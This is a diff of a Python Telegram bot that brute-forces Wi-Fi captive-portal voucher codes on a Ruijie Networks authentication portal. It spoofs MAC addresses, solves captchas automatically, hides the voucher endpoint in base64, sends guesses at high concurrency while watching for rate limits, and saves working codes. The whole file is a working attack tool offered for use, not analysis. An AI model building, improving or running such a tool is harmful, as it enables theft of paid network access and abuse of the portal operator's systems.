@@ -1,8 +1,8 @@
 # ═══════════════════════════════════════════════════════════════════════════
-#  Voucher Bot — Optimized (shared session, SIGTERM-safe, faster captcha)
+#  Voucher Bot — Combined & Fixed
 #  Requires env vars: BOT_TOKEN, GITHUB_TOKEN, REPO_OWNER, REPO_NAME, ADMIN_ID
 # ═══════════════════════════════════════════════════════════════════════════
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, signal
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
@@ -44,22 +44,17 @@ limited_texts    = {}   # {chat_id: [code, ...]}
 notify_setting   = {}   # {chat_id: bool}
 last_scan_params = {}   # {chat_id: {mode,lengths,target,plan_filters}}
 pending_brute    = {}   # {chat_id: {mode,lengths,target,plan_filters}}
-notify_state     = {}   # {chat_id: [{"msg_id","first_idx"}, ...]}
-limited_notify   = {}   # {chat_id: message_id}
+notify_state     = {}   # {chat_id: [{"msg_id","first_idx"}, ...]}   success pagination
+limited_notify   = {}   # {chat_id: message_id}                      limited single msg
 setup_confirm    = {}   # {chat_id: url}
 
 SUCCESS_CODE = asyncio.Queue()
-session      = None     # global shared aiohttp.ClientSession
+session      = None
 _connector   = None
 _voucher_sem = None
 _start_time  = time.monotonic()
-_shutdown_event = asyncio.Event()
 
-# ── Performance knobs ─────────────────────────────────────────────────────
-CONCURRENCY      = 400   # ↑ from 200 (back off if "request limited" appears)
-CAPTCHA_MAX_TRIES = 4    # ↓ from 8
-BATCH_SIZE       = 500   # ↓ from 1000 (faster progress updates)
-
+CONCURRENCY = 200
 STATE_FILE  = "state.json"
 
 
@@ -185,7 +180,7 @@ async def web_server():
     app.router.add_get('/', handle)
     runner = web.AppRunner(app)
     await runner.setup()
-    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 5000)))
+    port = int(os.environ.get('BOT_PORT', 5000))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
     logger.info(f"Web server started on port {port}")
@@ -248,6 +243,7 @@ MODE_INFO = {
 }
 
 def iter_codes(mode, length):
+    """Mode 1 + length ≤ 6 → exhaustive shuffled. Otherwise random."""
     mode = str(mode)
     length = int(length)
     if mode not in MODE_INFO:
@@ -265,6 +261,8 @@ def iter_codes(mode, length):
             yield str(i).zfill(length)
         return
 
+    # NOTE: for length 7+, collisions are possible. Set-dedup would cost
+    # huge RAM. For true exhaustiveness, prefer length ≤ 6 in mode 1.
     while True:
         yield "".join(random.choice(chars) for _ in range(length))
 
@@ -319,8 +317,8 @@ def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 
-# ── Session / URL helpers (uses global `session`) ─────────────────────────
-async def get_session_id(session_url, previous=None):
+# ── Session / URL helpers ─────────────────────────────────────────────────
+async def get_session_id(session_obj, session_url, previous=None):
     url = replace_mac(session_url, get_mac())
     headers = {
         'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
@@ -332,7 +330,7 @@ async def get_session_id(session_url, previous=None):
                        'Chrome/148.0.0.0 Safari/537.36'),
     }
     try:
-        async with session.get(
+        async with session_obj.get(
             url, headers=headers, allow_redirects=True,
             timeout=aiohttp.ClientTimeout(total=15)
         ) as req:
@@ -342,7 +340,7 @@ async def get_session_id(session_url, previous=None):
         logger.debug(f"[get_session_id] {e}")
         return previous
 
-async def Captcha_Image(session_id):
+async def Captcha_Image(session_obj, session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
@@ -351,14 +349,14 @@ async def Captcha_Image(session_id):
                        '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'),
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
-    async with session.get(
+    async with session_obj.get(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
         params=params, headers=headers,
         timeout=aiohttp.ClientTimeout(total=10)
     ) as req:
         return await req.read()
 
-async def Varify_Captcha(session_id, text):
+async def Varify_Captcha(session_obj, session_id, text):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'content-type': 'application/json',
@@ -366,7 +364,7 @@ async def Varify_Captcha(session_id, text):
         'user-agent': ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                        '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'),
     }
-    async with session.post(
+    async with session_obj.post(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
         headers=headers,
         json={'sessionId': session_id, 'authCode': text},
@@ -379,8 +377,10 @@ async def Varify_Captcha(session_id, text):
         return session_id if data.get("success") is True else None
 
 async def check_session_url(session_url):
+    # 1) SSRF guard
     if not is_safe_url(session_url):
         return False
+    # 2) query param check
     try:
         parsed = urlparse(session_url)
         params = parse_qs(parsed.query)
@@ -435,7 +435,7 @@ async def get_balance(token):
     return "N/A"
 
 
-# ── Core voucher check (shared session) ───────────────────────────────────
+# ── Core voucher check ────────────────────────────────────────────────────
 POST_URL = base64.b64decode(
     b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
 ).decode()
@@ -443,6 +443,7 @@ POST_URL = base64.b64decode(
 async def perform_check(session_url, code, chat_id,
                         scan_id=None, recheck=False,
                         plan_filters=None):
+    global _connector
     if not recheck:
         ct = scan_tasks.get(chat_id)
         if not ct or ct.get("scan_id") != scan_id:
@@ -452,57 +453,56 @@ async def perform_check(session_url, code, chat_id,
     session_id = None
 
     for attempt in range(3):
-        session_id = await get_session_id(session_url)
-        if not session_id:
-            await asyncio.sleep(0.2)
-            continue
-
-        auth_code = None
-        for _ in range(CAPTCHA_MAX_TRIES):
-            try:
-                img  = await Captcha_Image(session_id)
-                text = await Captcha_Text(img)
-                if text and await Varify_Captcha(session_id, text):
-                    auth_code = text
-                    break
-            except Exception as e:
-                logger.debug(f"[captcha] {e}")
+        async with aiohttp.ClientSession(
+            connector=_connector, connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=aiohttp.ClientTimeout(total=30)
+        ) as ts:
+            session_id = await get_session_id(ts, session_url)
+            if not session_id:
                 continue
-        if not auth_code:
-            continue
 
-        if not recheck:
-            ct = scan_tasks.get(chat_id)
-            if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
-                return
+            auth_code = None
+            for _ in range(8):
+                try:
+                    img  = await Captcha_Image(ts, session_id)
+                    text = await Captcha_Text(img)
+                    if text and await Varify_Captcha(ts, session_id, text):
+                        auth_code = text
+                        break
+                except Exception as e:
+                    logger.debug(f"[captcha] {e}")
+                    continue
+            if not auth_code:
+                continue
 
-        data = {"accessCode": code, "sessionId": session_id,
-                "apiVersion": 1, "authCode": auth_code}
-        headers = {
-            "authority": "portal-as.ruijienetworks.com",
-            "accept": "*/*",
-            "content-type": "application/json",
-            "origin": "https://portal-as.ruijienetworks.com",
-            "referer": (f"https://portal-as.ruijienetworks.com/download/"
-                        f"static/maccauth/src/index.html?sessionId={session_id}"),
-            "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
-                           "AppleWebKit/537.36 (KHTML, like Gecko) "
-                           "Chrome/139.0.0.0 Mobile Safari/537.36"),
-        }
-        try:
-            async with session.post(POST_URL, json=data, headers=headers,
-                                    timeout=aiohttp.ClientTimeout(total=20)) as req:
-                response = await req.text()
-                if req.status == 200 and attempt == 0:
-                    # Only log on attempt=1 or non-200 to reduce log spam
-                    logger.debug(f"[voucher] code={code} status={req.status}")
-                elif req.status != 200:
+            if not recheck:
+                ct = scan_tasks.get(chat_id)
+                if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
+                    return
+
+            data = {"accessCode": code, "sessionId": session_id,
+                    "apiVersion": 1, "authCode": auth_code}
+            headers = {
+                "authority": "portal-as.ruijienetworks.com",
+                "accept": "*/*",
+                "content-type": "application/json",
+                "origin": "https://portal-as.ruijienetworks.com",
+                "referer": (f"https://portal-as.ruijienetworks.com/download/"
+                            f"static/maccauth/src/index.html?sessionId={session_id}"),
+                "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
+                               "AppleWebKit/537.36 (KHTML, like Gecko) "
+                               "Chrome/139.0.0.0 Mobile Safari/537.36"),
+            }
+            try:
+                async with ts.post(POST_URL, json=data, headers=headers) as req:
+                    response = await req.text()
                     logger.info(f"[voucher] code={code} attempt={attempt+1} "
                                 f"status={req.status}")
-        except Exception as e:
-            logger.debug(f"[perform_check] post {e}")
-            response = None
-            continue
+            except Exception as e:
+                logger.debug(f"[perform_check] post {e}")
+                response = None
+                continue
 
         if response and 'request limited' in response:
             logger.warning(f"[perform_check] rate limited code={code} "
@@ -518,6 +518,7 @@ async def perform_check(session_url, code, chat_id,
         if recheck:
             return code
 
+        # Extract token from logonUrl if present, otherwise use session_id
         token = session_id
         try:
             res_data  = json.loads(response)
@@ -537,6 +538,7 @@ async def perform_check(session_url, code, chat_id,
         except Exception:
             pass
 
+        # Plan filter — ONLY apply if plan is known
         if plan_filters and plan_str not in ("N/A", "Error"):
             code_mins = plan_to_minutes(plan_str)
             if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
@@ -658,7 +660,7 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                     return
 
                 batch = []
-                for _ in range(BATCH_SIZE):
+                for _ in range(1000):
                     try:
                         batch.append(next(code_iter))
                     except StopIteration:
@@ -897,6 +899,7 @@ async def cmd_setup(message):
             "❌ Session URL မှားနေသည် (သို့) required params မပါပါ။")
         return
 
+    # If a previous session existed → ask to confirm (protects saved codes)
     if chat_id in user_data and user_data[chat_id].get("session_url") != url:
         setup_confirm[chat_id] = url
         markup = InlineKeyboardMarkup()
@@ -916,6 +919,7 @@ async def cmd_setup(message):
 
 
 async def _apply_setup(chat_id, url):
+    # Cancel any active scan
     if chat_id in scan_tasks:
         info = scan_tasks.pop(chat_id, None)
         if info and info.get("task"):
@@ -929,6 +933,7 @@ async def _apply_setup(chat_id, url):
     notify_state.pop(chat_id, None)
     limited_notify.pop(chat_id, None)
 
+    # Clear saved results for this chat
     if GITHUB_ENABLED:
         try:
             results, sha = await get_file_content("result.json")
@@ -1157,8 +1162,7 @@ async def cmd_status(message):
         f"⏱ Uptime: {h}h {m}m {s}s\n"
         f"🔍 Active Scans: {active}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
-        f"📡 GitHub Sync: {'ON' if GITHUB_ENABLED else 'OFF'}\n"
-        f"⚙️ Concurrency: {CONCURRENCY}"
+        f"📡 GitHub Sync: {'ON' if GITHUB_ENABLED else 'OFF'}"
     )
 
 
@@ -1266,31 +1270,10 @@ async def cmd_recheck(message):
 
 
 # ── Polling / main ────────────────────────────────────────────────────────
-def _handle_signal():
-    logger.info("Signal received — shutting down polling cleanly")
-    _shutdown_event.set()
-
 async def start_polling():
     backoff = 5
-    try:
-        loop = asyncio.get_running_loop()
-        for sig in (signal.SIGTERM, signal.SIGINT):
-            try:
-                loop.add_signal_handler(sig, _handle_signal)
-            except (NotImplementedError, RuntimeError):
-                pass
-    except Exception:
-        pass
-
-    while not _shutdown_event.is_set():
+    while True:
         try:
-            # Startup cleanup — clear webhook + stale updates
-            try:
-                await bot.delete_webhook(drop_pending_updates=True)
-                logger.info("Cleared webhook & pending updates")
-            except Exception as e:
-                logger.warning(f"delete_webhook failed: {e}")
-
             await bot.infinity_polling(timeout=20, request_timeout=20)
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
@@ -1298,68 +1281,29 @@ async def start_polling():
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            msg = str(e)
-            if "409" in msg or "Conflict" in msg:
-                logger.error(
-                    "❌ 409 Conflict — duplicate bot instance running. "
-                    "Railway → Settings → Deploy → Overlap time = 0. "
-                    "Waiting 30s for the old instance to die..."
-                )
-                await asyncio.sleep(30)
-            else:
-                logger.exception(f"Unexpected polling error: {e}")
-                await asyncio.sleep(backoff)
-                backoff = min(backoff * 2, 60)
+            logger.exception(f"Unexpected polling error: {e}")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
 
 
 async def main():
     global session, _connector, _voucher_sem
-
-    # Shared TCP connector (TCP connection pool)
-    _connector = aiohttp.TCPConnector(
-        limit=CONCURRENCY * 2,
-        limit_per_host=CONCURRENCY * 2,
-        ttl_dns_cache=300,
-        enable_cleanup_closed=True,
-        force_close=False,
-    )
-
-    # Shared ClientSession with DummyCookieJar (no per-check cookie storage)
+    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
     session = aiohttp.ClientSession(
         timeout=aiohttp.ClientTimeout(total=30),
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.DummyCookieJar(),
+        connector=_connector, connector_owner=False,
     )
-
     _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
-    logger.info(f"🚀 Voucher Bot starting... (CONCURRENCY={CONCURRENCY}, "
-                f"CAPTCHA_MAX_TRIES={CAPTCHA_MAX_TRIES}, BATCH={BATCH_SIZE})")
-
+    logger.info("🚀 Voucher Bot starting...")
     try:
         asyncio.create_task(web_server())
         if GITHUB_ENABLED:
             asyncio.create_task(github_update_scheduler())
         load_state()
         await load_saved_results()
-
-        polling_task = asyncio.create_task(start_polling())
-
-        # Wait for shutdown signal or polling end
-        done, pending = await asyncio.wait(
-            {polling_task, asyncio.create_task(_shutdown_event.wait())},
-            return_when=asyncio.FIRST_COMPLETED
-        )
-        for t in pending:
-            t.cancel()
-
+        await start_polling()
     finally:
-        logger.info("Shutting down...")
-        try:
-            await bot.delete_webhook()
-        except Exception:
-            pass
         await session.close()
         await _connector.close()
 
